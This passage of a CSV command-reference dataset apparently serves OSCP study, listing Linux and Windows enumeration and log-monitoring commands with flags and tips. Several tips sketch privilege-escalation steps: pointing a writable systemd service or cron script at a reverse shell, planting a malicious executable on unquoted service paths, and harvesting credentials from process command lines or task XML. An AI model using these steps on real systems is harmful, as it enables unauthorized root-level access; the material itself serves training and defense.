2 seconds.","high","","","","","{""-a"": ""Display all connections and listening ports"", ""-n"": ""Display addresses and port numbers in numeric form (no name resolution)"", ""-o"": ""Display owning process ID (PID) for each connection""}","","[""win-ps-netstat-process""]",""
"win-ps-netstat-process","PowerShell Network Connections","monitoring","Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess","PowerShell cmdlet for TCP connections with process IDs (modern Windows)","network-monitoring","","Modern PowerShell alternative to netstat.

Easier to parse and filter.

For UDP:
Get-NetUDPEndpoint.

Time estimate:
3 seconds.

OSCP tip:
One-liner to show listening ports with names:
Get-NetTCPConnection -State Listen | Select LocalPort,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).Name}}","high","","","","","{""Get-NetTCPConnection"": ""Retrieves TCP connection properties"", ""Select-Object"": ""Choose specific properties to display"", ""OwningProcess"": ""PID of process that owns the connection""}","","[""win-netstat-process-mapping""]",""
"win-tasklist-pid","Windows Get Process by PID","monitoring","tasklist /fi ""PID eq <PID>""","Look up Windows process name and details by PID (for netstat output)","network-monitoring","tasklist /fi ""PID eq 1234""","Quick way to map netstat PIDs to process names.

Common workflow:
netstat -ano | findstr :443 (get PID)  tasklist /fi ""PID eq 1234"" (get name).

Time estimate:
<1 second.","medium","","","","","{""/fi"": ""Filter - apply filter to tasklist output"", ""\""PID eq <PID>\"""": ""Filter expression - show only process with matching PID""}","","[""win-wmic-process-pid"", ""win-ps-get-process""]",""
"win-wmic-process-pid","WMIC Get Process by PID","monitoring","wmic process where ProcessId=<PID> get ProcessId,Name,ExecutablePath,CommandLine","Get detailed Windows process information by PID including full path and command line","network-monitoring","wmic process where ProcessId=4567 get ProcessId,Name,ExecutablePath,CommandLine","More detailed than tasklist.

CommandLine often reveals sensitive data.

Time estimate:
1 second.","medium","","","","","{""process"": ""Query Win32_Process class"", ""where ProcessId=<PID>"": ""Filter to specific PID"", ""get"": ""Retrieve specific properties"", ""CommandLine"": ""Full command with arguments (may contain credentials)""}","","[""win-tasklist-pid""]",""
"systemctl-running-services","List Running systemd Services","monitoring","systemctl list-units --type=service --state=running","Show all currently active systemd services (modern Linux distributions)","service-enumeration","","systemd is the init system for most modern Linux distributions (RHEL 7+, Ubuntu 16.04+, Debian 8+).

OSCP tip:
Focus on custom services (not part of base OS) - often have misconfigurations.

Time estimate:
2 seconds.

To see ALL services (including failed):
systemctl list-units --type=service --all","high","","","","","{""list-units"": ""List loaded units (services, sockets, targets, etc.)"", ""--type=service"": ""Filter to show only service units"", ""--state=running"": ""Filter to show only services in running state (active)""}","[""ps-aux-full""]","[""service-status-all-sysv""]","[""systemctl-service-permissions"", ""systemctl-enabled-services"", ""journalctl-service-follow"", ""linpeas-run""]"
"systemctl-enabled-services","List Enabled (Auto-Start) Services","monitoring","systemctl list-unit-files --type=service --state=enabled","Show services configured to start automatically at boot","service-enumeration","","Enabled services persist across reboots - key for persistence/backdoor detection.

OSCP tip:
Custom services in /etc/systemd/system are often exploit targets.

Time estimate:
3 seconds.","medium","","","","","{""list-unit-files"": ""List all available unit files (not just loaded units)"", ""--type=service"": ""Filter to service units"", ""--state=enabled"": ""Show only services enabled for auto-start at boot""}","","",""
"systemctl-service-permissions","Check systemd Service File Permissions","monitoring","ls -la /etc/systemd/system/*.service","List custom systemd service files with permissions (privilege escalation vector)","service-enumeration","","CRITICAL for OSCP privilege escalation.

Writable service files = instant root if service runs as root.

Also check /lib/systemd/system/ (system services).

Time estimate:
2 seconds.

Exploit pattern:
(1) Find writable .service file, (2) Modify ExecStart=/path/to/reverse_shell, (3) sudo systemctl restart <SERVICE>.","high","","","","","{""ls -la"": ""Long listing with all files including hidden"", ""/etc/systemd/system/"": ""Directory for custom/user-created service files"", ""*.service"": ""Wildcard for all service unit files""}","[""ps-aux-full"", ""systemctl-running-services""]","[""service-status-all-sysv"", ""chkconfig-list-sysv""]","[""suid-find"", ""linpeas-run"", ""cron-directories-list""]"
"service-status-all-sysv","SysV Init Services Status","monitoring","service --status-all","List all SysV init services with status (+ running, - stopped) - older Linux systems","service-enumeration","","SysV init used on older Linux (pre-systemd).

Still found in OSCP labs.

[+] = running, [-] = stopped, [?] = status unknown.

Time estimate:
3 seconds.

Service scripts in /etc/init.d/ - check permissions for privesc.","medium","","","","","{""--status-all"": ""Display status of all services (+ for running, - for stopped, ? for unknown)""}","","[""systemctl-running-services""]",""
"chkconfig-list-sysv","SysV Runlevel Configuration","monitoring","chkconfig --list","Show which SysV services are enabled at each runlevel (RHEL/CentOS)","service-enumeration","","RHEL/CentOS specific.

Runlevels:
0=halt, 1=single-user, 3=multi-user, 5=graphical, 6=reboot.

Time estimate:
2 seconds.","low","","","","","{""--list"": ""List all services and their runlevel configuration (0-6 runlevels)""}","","",""
"win-sc-query-services","Windows List All Services","monitoring","sc query","List all Windows services with current state using Service Control command","service-enumeration","","Service Control (sc.exe) is built-in Windows service management tool.

OSCP tip:
Focus on services with STATE=RUNNING and user-created services (non-Microsoft).

Time estimate:
5 seconds.","high","","","","","{""query"": ""Query service status (no arguments = all services)""}","","[""win-wmic-service-full"", ""win-ps-get-service""]",""
"win-sc-query-all","Windows List All Services (Including Stopped)","monitoring","sc query state= all","Query all services including stopped ones (comprehensive service enumeration)","service-enumeration","","Space after '=' is REQUIRED:
'state= all' not 'state=all'.

Shows stopped services which may have weak permissions or unquoted paths.

Time estimate:
10 seconds.","medium","","","","","{""query"": ""Query service status"", ""state= all"": ""Include all states (running, stopped, paused). NOTE: Space after '=' is required by sc.exe syntax""}","","[""win-wmic-service-full"", ""get-service""]",""
"win-sc-query-config","Windows Service Configuration Details","monitoring","sc qc <SERVICE_NAME>","Get detailed configuration for specific Windows service (binary path, start type, dependencies)","service-enumeration","sc qc Spooler","CRITICAL for Windows privilege escalation.

Check for:
(1) Unquoted service paths with spaces, (2) Writable service binaries, (3) Services running as LocalSystem/SYSTEM.

Time estimate:
1 second.

Common privesc:
Unquoted path 'C:\Program Files\My Service\service.exe'  Place malicious 'C:\Program.exe'.","high","","","","","{""qc"": ""Query Configuration - shows service configuration details including BINARY_PATH_NAME, START_TYPE, DEPENDENCIES""}","","[""win-wmic-service-path""]",""
"win-wmic-service-full","WMIC Service Enumeration","monitoring","wmic service list brief","List all Windows services with brief details using WMI","service-enumeration","","WMIC deprecated in Windows 11+ but still in OSCP labs.

For specific properties:
wmic service get Name,PathName,StartMode,State.

Time estimate:
5 seconds.","high","","","","","{""service"": ""Query Win32_Service WMI class"", ""list"": ""List service instances"", ""brief"": ""Display brief format (ExitCode, Name, ProcessId, StartMode, State, Status)""}","","[""win-sc-query-all"", ""win-ps-get-service""]",""
"win-wmic-service-path","WMIC Service Paths (Unquoted Path Check)","monitoring","wmic service get Name,PathName,StartMode,State","List Windows services with full binary paths to identify unquoted service path vulnerabilities","service-enumeration","","CRITICAL Windows privesc technique.

Unquoted path 'C:\Program Files\My App\service.exe' allows placing 'C:\Program.exe' or 'C:\Program Files\My.exe'.

Time estimate:
5 seconds.

Filter for unquoted:
wmic service get Name,PathName | findstr /v /i ""C:\Windows"" | findstr /i /v '""'.","high","","","","","{""service"": ""Query Win32_Service class"", ""get"": ""Retrieve specific properties"", ""Name"": ""Service name"", ""PathName"": ""Full path to service executable (CRITICAL for finding unquoted paths)"", ""StartMode"": ""Auto, Manual, or Disabled"", ""State"": ""Running, Stopped, etc.""}","","[""win-sc-query-config"", ""win-unquoted-service-paths""]",""
"win-ps-get-service","PowerShell Get Services","monitoring","Get-Service | Where-Object {$_.Status -eq ""Running""}","PowerShell cmdlet to list running Windows services","service-enumeration","","Modern PowerShell approach.

For all services:
Get-Service (no filter).

For stopped:
Where-Object {$_.Status -eq 'Stopped'}.

Time estimate:
3 seconds.","high","","","","","{""Get-Service"": ""Retrieves all Windows services"", ""Where-Object"": ""Filters results based on condition"", ""$_.Status -eq \""Running\"""": ""Filter to show only services with Running status""}","","[""win-sc-query-services"", ""win-wmic-service-full""]",""
"win-ps-get-service-details","PowerShell Service Details with Paths","monitoring","Get-WmiObject win32_service | Select-Object Name,State,PathName","PowerShell WMI query for service details including executable paths","service-enumeration","","PowerShell WMI approach (modern).

Time estimate:
5 seconds.

One-liner for unquoted path detection:
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike '""*' -and $_.PathName -like '* *' -and $_.PathName -like 'C:\Program*'} | Select Name,PathName","high","","","","","{""Get-WmiObject"": ""Query WMI objects"", ""win32_service"": ""WMI class for services"", ""Select-Object"": ""Choose specific properties"", ""PathName"": ""Full path to service executable (unquoted path detection)""}","","[""win-wmic-service-path"", ""win-sc-query-config""]",""
"proc-cmdline-all-processes","View All Process Command Lines","monitoring","cat /proc/*/cmdline | tr '\0' ' '","Display command line arguments for all running processes by reading /proc filesystem","process-monitoring","","Each process has /proc/PID/cmdline containing its command line with null-byte separators.

Useful for detecting suspicious processes or hidden arguments.","high","","","","","{""tr '\\0' ' '"": ""Translates null bytes (\\0) in cmdline files to spaces for readable output""}","","",""
"ps-grep-pattern","Filter Processes by Pattern","monitoring","ps aux | grep <PATTERN>","Search running processes for specific pattern in command or arguments","process-monitoring","ps aux | grep apache|nginx","Piping ps output to grep is common but creates an extra grep process in results.

Use pgrep for cleaner output.","high","","","","","","","[""ps-aux-full"", ""ps-grep-pattern""]",""
"ps-grep-extract-pid","Extract PIDs by Process Name","monitoring","ps aux | grep <PROCESS_NAME> | awk '{print $2}'","Find process by name and extract only the PID using awk","process-monitoring","ps aux | grep sshd | awk '{print $2}'","PID is always column 2 in 'ps aux' output.

More reliable alternatives:
pidof <name> or pgrep -f <pattern>","medium","","","","","{""awk '{print $2}'"": ""Extracts second column (PID) from ps aux output""}","","[""ps-grep-pattern""]",""
"proc-cmdline-specific-pid","View Specific Process Command Line","monitoring","cat /proc/<PID>/cmdline | tr '\0' ' '","Display command line arguments for a specific process by PID","process-monitoring","cat /proc/1234/cmdline | tr '\0' ' '","/proc/PID/cmdline shows exact command with all arguments.

Useful for revealing hidden flags or configurations.","high","","","","","{""tr '\\0' ' '"": ""Converts null byte delimiters to spaces for readability""}","","",""
"crontab-user-direct-read","Read User Crontab File Directly","monitoring","cat /var/spool/cron/crontabs/<USERNAME>","Directly read user's crontab file from filesystem (requires root or specific permissions)","scheduled-tasks","cat /var/spool/cron/crontabs/www-data","Direct file access requires root.

Preferred method:
'crontab -u <user> -l'.

File location varies:
Debian/Ubuntu use /var/spool/cron/crontabs/, RedHat uses /var/spool/cron/","high","","","","","","","[""crontab-user-list""]",""
"less-etc-crontab","View System-Wide Crontab with Less","monitoring","less /etc/crontab","Interactively view system-wide crontab file with pagination","scheduled-tasks","","less allows scrolling and searching (use / to search).

System crontab includes run-parts entries for hourly/daily/weekly/monthly jobs.","high","","","","","","","[""crontab-system-wide""]",""
"find-all-cron-files","Find All Cron Configuration Files","monitoring","find /etc/cron* -type f","Locate all cron-related configuration files in /etc directory","scheduled-tasks","","Finds files in:
/etc/cron.d/, /etc/cron.hourly/, /etc/cron.daily/, /etc/cron.weekly/, /etc/cron.monthly/, and /etc/crontab.

Essential for comprehensive scheduled task enumeration.","high","","","","","{""-type f"": ""Match only regular files (exclude directories)"", ""/etc/cron*"": ""Glob pattern matching /etc/crontab, /etc/cron.d/, /etc/cron.daily/, etc.""}","","",""
"at-command-utility","AT Command-Line Scheduler","monitoring","at","Schedule one-time tasks using the AT utility (alternative to cron for non-recurring jobs)","scheduled-tasks","","AT utility schedules one-time jobs.

View queued jobs:
'atq'.

View job details:
'at -c <job_id>'.

Jobs stored in /var/spool/at/.

Requires atd daemon running.","medium","","","","","","","",""
"ls-at-spool-directory","List AT Job Spool Directory","monitoring","ls -la /var/spool/at/","Enumerate scheduled AT jobs by listing spool directory","scheduled-tasks","","Direct filesystem inspection of AT jobs.

Job files named with format 'a<timestamp><queue>'.

Better method:
use 'atq' command.

Requires appropriate permissions.","medium","","","","","","","",""
"tail-follow-syslog","Tail Syslog in Real-Time","monitoring","tail -f /var/log/syslog","Monitor syslog file in real-time as new entries are written","log-monitoring","","Syslog path varies:
/var/log/syslog (Debian/Ubuntu), /var/log/messages (RedHat/CentOS).

On systemd systems, prefer journalctl.

Use Ctrl+C to exit.","high","","","","","{""-f"": ""Follow mode - continuously display new lines appended to file""}","","[""journalctl-follow""]",""
"journalctl-kernel-messages","View Kernel Messages via Journald","monitoring","journalctl -k","Display kernel messages from systemd journal (equivalent to dmesg on systemd systems)","log-monitoring","","Requires systemd.

Shows same information as dmesg but with timestamps and systemd formatting.

Use -f to follow in real-time.","medium","","","","","{""-k"": ""Show only kernel messages (equivalent to --dmesg)""}","","[""dmesg-kernel-messages""]",""
"journalctl-kernel-follow","Follow Kernel Messages in Real-Time","monitoring","journalctl -kf","Monitor kernel messages in real-time via journald","log-monitoring","","Combines -k (kernel) and -f (follow).

Useful for monitoring hardware events, driver issues, or kernel-level security events in real-time.","medium","","","","","{""-k"": ""Show only kernel messages"", ""-f"": ""Follow mode - continuously display new entries""}","","[""dmesg-follow""]",""
"journalctl-ssh-failed-logins","Filter SSH Failed Login Attempts","monitoring","journalctl -u ssh | grep -i failed","Search SSH service logs for failed authentication attempts","log-monitoring","","Service name may vary:
ssh, sshd, ssh.service.

On non-systemd systems, check /var/log/auth.log or /var/log/secure directly.","high","","","","","{""-u ssh"": ""Filter logs for the ssh service unit"", ""grep -i failed"": ""Case-insensitive search for 'failed' in output""}","","",""
"journalctl-sudo-commands","Search Sudo Command Execution Logs","monitoring","journalctl | grep 'sudo.*COMMAND'","Find all sudo command executions logged by journald","log-monitoring","","Reveals privileged command history.

Pattern matches sudo logs containing 'COMMAND=' entries.

For focused output:
journalctl _COMM=sudo | grep COMMAND=","high","","","","","","","",""
"journalctl-failed-password","Search Failed Password Attempts","monitoring","journalctl | grep 'Failed password'","Find all failed password authentication attempts across all services","log-monitoring","","Covers SSH, su, sudo, login, and other PAM-authenticated services.

Add -S (since) flag for time range:
journalctl -S today | grep 'Failed password'","high","","","","","","","",""
"ls-init-d","List SysVinit Services","monitoring","ls /etc/init.d/","Enumerate legacy SysVinit service scripts","service-monitoring","","Shows SysVinit scripts on older systems or systemd systems with legacy services.

On systemd:
use 'systemctl list-unit-files'.

Service scripts are executable shell scripts.","medium","","","","","","","[""systemctl-list""]",""
"top-snapshot-memory-sorted","Top Memory Consumers Snapshot","monitoring","top -bn1 -o %MEM | head -20","Single snapshot of top 20 processes sorted by memory usage","resource-monitoring","","Batch mode suitable for scripting.

Remove head to see all processes.

Alternative:
ps aux --sort=-%mem | head -20","medium","","","","","{""-b"": ""Batch mode (non-interactive)"", ""-n1"": ""Run for 1 iteration only"", ""-o %MEM"": ""Sort by memory percentage"", ""| head -20"": ""Show only first 20 lines (header + top processes)""}","","",""
"top-snapshot-cpu-sorted","Top CPU Consumers Snapshot","monitoring","top -bn1 -o %CPU | head -20","Single snapshot of top 20 processes sorted by CPU usage","resource-monitoring","","Useful for identifying CPU-intensive processes.

CPU% shows usage since process start, not instantaneous.

For real-time:
use interactive top without -bn1.","medium","","","","","{""-b"": ""Batch mode (non-interactive)"", ""-n1"": ""Run for 1 iteration only"", ""-o %CPU"": ""Sort by CPU percentage"", ""| head -20"": ""Show only first 20 lines""}","","",""
"cat-proc-meminfo","View Detailed Memory Information","monitoring","cat /proc/meminfo","Display comprehensive memory statistics from kernel","resource-monitoring","","Shows total, free, available, buffers, cached, swap, and more.

Key fields:
MemTotal, MemFree, MemAvailable (best indicator of free memory), SwapTotal, SwapFree.","low","","","","","","","",""
"top-snapshot-batch","Top Process Snapshot (Batch Mode)","monitoring","top -bn1","Single non-interactive snapshot of system processes and resource usage","resource-monitoring","","Useful for scripting or capturing process state.

Shows CPU, memory, load average, and process list.

Default sort is by CPU usage.","medium","","","","","{""-b"": ""Batch mode (non-interactive, suitable for piping)"", ""-n1"": ""Run for 1 iteration then exit""}","","[""ps-aux-full""]",""
"sar-cpu-monitoring","SAR CPU Utilization Monitoring","monitoring","sar -u 1 5","Collect CPU utilization statistics every 1 second for 5 iterations","resource-monitoring","","Requires sysstat package.

Shows %user, %system, %iowait, %idle.

Useful for performance analysis and baseline establishment.

Historical data in /var/log/sa/.","low","","","","","{""-u"": ""Report CPU utilization (default)"", ""1"": ""Sample interval in seconds"", ""5"": ""Number of samples to collect""}","","",""
"cat-proc-loadavg","View System Load Average","monitoring","cat /proc/loadavg","Display 1, 5, and 15 minute load averages","resource-monitoring","","Format:
load1 load5 load15 running/total last_pid.

Load represents average number of processes in run queue.

Values > CPU count indicate potential bottleneck.","low","","","","","","","",""
"ls-proc-fd-all","List All Process File Descriptors","monitoring","ls -l /proc/*/fd/","Enumerate all file descriptors for all processes (manual inspection required)","resource-monitoring","","Shows open files, sockets, pipes for all processes.

Requires root for other users' processes.

Better alternative:
lsof.

Useful for identifying network connections or open files.","medium","","","","","","","[""lsof-list""]",""
"lsof-directory-non-recursive","LSOF Directory Usage (Non-Recursive)","monitoring","lsof +d <DIRECTORY>","List processes using files in specific directory (non-recursive, faster than +D)","resource-monitoring","lsof +d /var/www/html","Faster than +D (recursive).

Use +D for recursive search.

Common use:
identify which processes are accessing files in specific directory.","medium","","","","","{""+d"": ""Search directory for open files (non-recursive, faster)""}","","[""lsof-directory-usage""]",""
"cat-wtmp-utmpdump","Parse WTMP Login Records","monitoring","cat /var/log/wtmp | utmpdump","Convert binary wtmp login records to human-readable format","log-monitoring","","wtmp logs all login/logout events.

Binary format requires utmpdump or last command.

Better alternative:
'last' command provides formatted output.

Useful for forensics and user activity tracking.","medium","","","","","{""utmpdump"": ""Utility to decode binary utmp/wtmp files""}","","",""
"crontab-user-list","List User Cron Jobs","monitoring","crontab -l","Display current user's cron jobs (scheduled tasks)","scheduled-tasks","","Cron format:
minute hour day month weekday command.

OSCP tip:
Check if cron scripts are writable - modify to run reverse shell as cron user.

Time estimate:
<1 second.

Special strings:
@reboot (run at startup), @daily, @hourly, @weekly, @monthly.","high","","","","","{""-l"": ""List - display current user's crontab entries""}","","[""cron-directories-list"", ""linux-systemd-timers""]","[""crontab-user-specific"", ""crontab-system-wide"", ""cron-directories-list"", ""pspy-monitor"", ""suid-find""]"
"crontab-user-specific","List Another User's Cron Jobs","monitoring","sudo crontab -l -u <USERNAME>","View cron jobs for a specific user (requires root privileges)","scheduled-tasks","sudo crontab -l -u root","Root's crontab is high-value target.

If root cron runs writable script, instant privesc.

Crontab location varies:
/var/spool/cron/crontabs/ (Debian/Ubuntu), /var/spool/cron/ (RHEL/CentOS).

Time estimate:
<1 second.","high","","","","","{""sudo"": ""Required to view other users' crontabs"", ""-l"": ""List crontab entries"", ""-u"": ""Specify user whose crontab to display""}","[""crontab-user-list""]","[""crontab-user-list"", ""cron-directories-list""]","[""cron-directories-list"", ""crontab-system-wide"", ""pspy-monitor"", ""cron-enum""]"
"crontab-system-wide","View System-Wide Crontab","monitoring","cat /etc/crontab","Display system-wide cron configuration (runs as root)","scheduled-tasks","","/etc/crontab differs from user crontabs - includes username field.

Format:
minute hour day month weekday user command.

OSCP tip:
Check if PATH includes writable dirs like /tmp - allows command hijacking.

Time estimate:
<1 second.","high","","","","","","","[""less-etc-crontab""]",""
"cron-directories-list","List Cron Directories","monitoring","ls -la /etc/cron.*","List all cron directories (hourly, daily, weekly, monthly) and their contents","scheduled-tasks","","Scripts in these directories run automatically:
cron.hourly (every hour), cron.daily (daily), cron.weekly (weekly), cron.monthly (monthly).

All run as root by default.

CRITICAL privesc vector if writable.

Time estimate:
2 seconds.

Command to find writable:
find /etc/cron* -type f -writable 2>/dev/null","high","","","","","{""ls -la"": ""Long listing with all files"", ""/etc/cron.*"": ""Wildcard matches cron.hourly, cron.daily, cron.weekly, cron.monthly, cron.d""}","[""crontab-user-list""]","[""crontab-user-list"", ""crontab-system-wide"", ""linux-systemd-timers""]","[""pspy-monitor"", ""suid-find"", ""linpeas-run"", ""cron-enum""]"
"cron-log-recent","View Recent Cron Executions","monitoring","grep -r ""CRON"" /var/log/syslog","Search system logs for recent cron job executions (verify cron activity)","scheduled-tasks","","Logs show when cron jobs execute and as which user.

Useful for timing privilege escalation attempts.

On systemd systems:
journalctl -u cron.

Time estimate:
3-5 seconds.","medium","","","","","{""grep"": ""Search for pattern"", ""-r"": ""Recursive search (multiple log files)"", ""\""CRON\"""": ""Search pattern for cron log entries"", ""/var/log/syslog"": ""System log file (may be /var/log/messages on RHEL)""}","","",""
"win-schtasks-list-all","Windows List All Scheduled Tasks","monitoring","schtasks /query /fo LIST /v","Display all Windows scheduled tasks with verbose details","scheduled-tasks","","CRITICAL for Windows privesc and persistence detection.

Output is verbose (20+ properties per task).

OSCP tips:
(1) Look for tasks with writable executables, (2) Tasks running as SYSTEM with Enabled status, (3) Custom tasks (non-Microsoft) in \Task Scheduler Library\.

Time estimate:
10-30 seconds depending on task count.","high","","","","","{""/query"": ""Display scheduled tasks"", ""/fo LIST"": ""Format output as list (easier to read than table)"", ""/v"": ""Verbose - display detailed information including task actions, triggers, last run time""}","","[""win-ps-scheduled-tasks"", ""get-scheduledtask""]",""
"win-ps-scheduled-tasks","PowerShell List Scheduled Tasks","monitoring","Get-ScheduledTask | Where-Object {$_.State -ne ""Disabled""}","PowerShell cmdlet to list enabled Windows scheduled tasks","scheduled-tasks","","Modern PowerShell approach - faster and easier to parse than schtasks.

To see all tasks:
Get-ScheduledTask (no filter).

Time estimate:
5 seconds.

One-liner for custom tasks:
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*' -and $_.State -eq 'Ready'}","high","","","","","{""Get-ScheduledTask"": ""Retrieves all scheduled tasks"", ""Where-Object"": ""Filter results"", ""$_.State -ne \""Disabled\"""": ""Exclude disabled tasks (show only Ready/Running tasks)""}","","[""win-schtasks-list-all""]",""
"win-ps-scheduled-task-info","PowerShell Scheduled Task Details","monitoring","Get-ScheduledTask -TaskName <TASK_NAME> | Get-ScheduledTaskInfo","Get detailed information for specific scheduled task including last run time and result","scheduled-tasks","Get-ScheduledTask -TaskName MyBackup | Get-ScheduledTaskInfo","Useful for verifying task execution status.

LastTaskResult 0x0 = success, other values indicate errors.

Time estimate:
1 second.","medium","","","","","{""Get-ScheduledTask"": ""Retrieve task object"", ""-TaskName"": ""Specify task name"", ""Get-ScheduledTaskInfo"": ""Get additional info (last run time, last result, next run time)""}","","",""
"win-schtasks-task-xml","Export Scheduled Task XML","monitoring","schtasks /query /tn <TASK_PATH> /xml","Export scheduled task definition as XML (may contain credentials or sensitive data)","scheduled-tasks","schtasks /query /tn \Microsoft\Windows\MyTask /xml","XML may contain Base64-encoded credentials or sensitive command arguments.

Time estimate:
1 second.

Save to file:
schtasks /query /tn <TASK> /xml > task.xml","medium","","","","","{""/query"": ""Query task"", ""/tn"": ""Task name with full path"", ""/xml"": ""Output task definition in XML format (includes all configuration details)""}","","",""
"win-wmic-scheduled-job","WMIC AT Jobs (Legacy)","monitoring","wmic job list full","List legacy AT jobs (older Windows scheduling system, pre-Task Scheduler)","scheduled-tasks","","AT jobs are legacy (Windows NT/2000 era), rarely used in modern systems.

Included for completeness in older OSCP labs.

Time estimate:
1 second.","low","","","","","{""job"": ""Query Win32_ScheduledJob WMI class (AT command jobs)"", ""list full"": ""Display all properties""}","","",""
"linux-at-jobs-list","List Linux AT Jobs","monitoring","atq","List pending AT jobs (one-time scheduled commands)","scheduled-tasks","","AT is for one-time scheduled tasks (unlike cron for recurring).

Less common than cron.

View job:
at -c <JOB_ID>.

Time estimate:
<1 second.","low","","","","","","","",""
"linux-systemd-timers","List systemd Timers","monitoring","systemctl list-timers --all","List all systemd timers (modern Linux cron alternative)","scheduled-tasks","","systemd timers are modern replacement for cron on systemd-based Linux.

Timers trigger .service units.

OSCP tip:
Check /etc/systemd/system/ for custom timers.

Time estimate:
2 seconds.

To see active only:
systemctl list-timers (no --all)","medium","","","","","{""list-timers"": ""List timer units (systemd's scheduling mechanism)"", ""--all"": ""Show all timers including inactive ones""}","","",""
"tail-follow-log","Follow Log File (Real-Time)","monitoring","tail -f <LOG_FILE>","Monitor log file in real-time, displaying new lines as they are written","log-monitoring","tail -f /var/log/syslog","CRITICAL for OSCP defense monitoring and troubleshooting.

Press Ctrl+C to exit.

Common logs:
/var/log/auth.log (authentication), /var/log/syslog (system), /var/log/apache2/access.log (web).

Time estimate:
runs continuously until stopped.

Manual alternative:
while true; do tail -n 1 <FILE>; sleep 1; done","high","","","","","{""-f"": ""Follow - output appended data as file grows (real-time monitoring)""}","","[""tail-follow-multiple"", ""journalctl-follow""]",""
"tail-follow-filter","Follow Log with Grep Filter","monitoring","tail -f <LOG_FILE> | grep --line-buffered <PATTERN>","Monitor log file in real-time, showing only lines matching a pattern","log-monitoring","tail -f /var/log/auth.log | grep --line-buffered Failed password","--line-buffered is REQUIRED or grep will buffer output and display will be delayed.

OSCP defense patterns:
'Failed password' (brute force), 'Invalid user' (enumeration), 'Accepted publickey' (successful login), 'sudo.*COMMAND' (privilege usage).

Time estimate:
runs continuously.","high","","","","","{""-f"": ""Follow log in real-time"", ""| grep"": ""Pipe to grep for filtering"", ""--line-buffered"": ""Force grep to flush output immediately (required for real-time display)""}","[""tail-follow-log""]","[""tail-follow-log"", ""journalctl-follow"", ""journalctl-service-follow""]","[""grep-auth-failed"", ""grep-sudo-commands"", ""lastb-failed-logins"", ""journalctl-service-follow""]"
"tail-follow-multiple","Follow Multiple Log Files","monitoring","tail -f <LOG_FILE1> <LOG_FILE2>","Monitor multiple log files simultaneously in real-time with file labels","log-monitoring","tail -f /var/log/syslog /var/log/auth.log","File headers show which file each line comes from:
==> /var/log/syslog <==.

Useful for correlating events across logs.

Time estimate:
runs continuously.","medium","","","","","{""-f"": ""Follow mode for multiple files - displays filename headers""}","","",""
"journalctl-follow","Follow systemd Journal (Real-Time)","monitoring","journalctl -f","Monitor systemd journal in real-time (unified logging for modern Linux)","log-monitoring","","systemd journal is unified log system on modern Linux.

Combines all system and service logs.

OSCP tip:
Great for monitoring service failures, authentication attempts, and system events.

Time estimate:
runs continuously.

For systems without systemd:
fall back to tail -f /var/log/syslog","high","","","","","{""-f"": ""Follow - display new journal entries as they are added (like tail -f)""}","","[""tail-follow-log""]",""
"journalctl-service-follow","Follow Specific Service Logs","monitoring","journalctl -u <SERVICE> -f","Monitor logs for a specific systemd service in real-time","log-monitoring","journalctl -u ssh -f","Service-specific monitoring helps troubleshoot issues.

Common services:
ssh, apache2, nginx, mysql, postgresql, cron.

Can monitor multiple:
journalctl -u ssh -u apache2 -f.

Time estimate:
runs continuously.","high","","","","","{""-u"": ""Unit - filter by systemd unit (service)"", ""-f"": ""Follow in real-time""}","[""journalctl-follow"", ""systemctl-running-services""]","[""tail-follow-filter"", ""tail-follow-log"", ""journalctl-follow""]","[""journalctl-priority-filter"", ""grep-auth-failed"", ""grep-sudo-commands"", ""systemctl-running-services""]"
"journalctl-priority-filter","Filter Journal by Priority","monitoring","journalctl -p <PRIORITY>","Display journal entries at or above specified priority level (emerg, alert, crit, err, warning, notice, info, debug)","log-monitoring","journalctl -p err","Priority levels (lowest to highest):
0=emerg, 1=alert, 2=crit, 3=err, 4=warning, 5=notice, 6=info, 7=debug.

-p err shows errors, critical, alert, and emergency.

For errors only (not above):
journalctl PRIORITY=3.

Time estimate:
1-5 seconds.","medium","","","","","{""-p"": ""Priority - filter by syslog priority level (0=emerg to 7=debug). Displays specified level and above.""}","","",""
"journalctl-time-range","View Journal by Time Range","monitoring","journalctl --since ""<TIME_SPEC>"" --until ""<TIME_SPEC>""","Display journal entries within a specific time range","log-monitoring","journalctl --since ""2024-01-01 10:00:00"" --until ""2024-01-01 10:00:00""","Time formats:
'YYYY-MM-DD HH:MM:SS', 'yesterday', 'today', '1 hour ago', '30 minutes ago', '2 days ago'.

Supports natural language.

For recent events:
journalctl --since ""5 minutes ago"".

Time estimate:
1-10 seconds.","medium","","","","","{""--since"": ""Show entries from this time onward (inclusive)"", ""--until"": ""Show entries up to this time (inclusive)""}","","",""
"dmesg-kernel-messages","View Kernel Ring Buffer","monitoring","dmesg","Display kernel messages from boot and hardware events (ring buffer)","log-monitoring","","Kernel ring buffer shows hardware events, driver loading, errors.

Useful for hardware troubleshooting and detecting inserted USB devices.

Output can be large - pipe to less:
dmesg | less.

Time estimate:
1-2 seconds.","medium","","","","","","","",""
"dmesg-follow","Follow Kernel Messages (Real-Time)","monitoring","dmesg -w","Monitor kernel messages in real-time (hardware events, driver issues, errors)","log-monitoring","","-w flag requires dmesg from util-linux 2.21+ (2012+).

Older systems:
use watch -n 1 'dmesg | tail -20'.

Useful for detecting hardware insertion (USB drives).

Time estimate:
runs continuously.","low","","","","","{""-w"": ""Wait for new messages - follow mode (like tail -f)""}","","",""
"grep-auth-failed","Search for Failed Authentication","monitoring","grep -i ""failed"" /var/log/auth.log","Search authentication log for failed login attempts (brute force detection)","log-monitoring","","CRITICAL for OSCP defense.

Patterns:
'Failed password for <USER>' (wrong password), 'Invalid user <USER>' (enumeration), 'Failed publickey for <USER>' (SSH key failed).

Multiple failures from same IP = brute force attack.

Time estimate:
1-3 seconds.

Log location varies:
/var/log/auth.log (Debian/Ubuntu), /var/log/secure (RHEL/CentOS).","high","","","","","{""-i"": ""Ignore case (match 'failed', 'Failed', 'FAILED')""}","","[""lastb-failed-logins""]",""
"grep-sudo-commands","Search for Sudo Command Usage","monitoring","grep -i ""sudo.*COMMAND"" /var/log/auth.log","Extract all sudo command executions from auth log (privilege escalation tracking)","log-monitoring","","CRITICAL for defense auditing.

Each sudo execution is logged with:
timestamp, user, command, working directory.

OSCP tip:
Look for suspicious commands:
bash, sh, vi, less, find, python (all can spawn shells).

Time estimate:
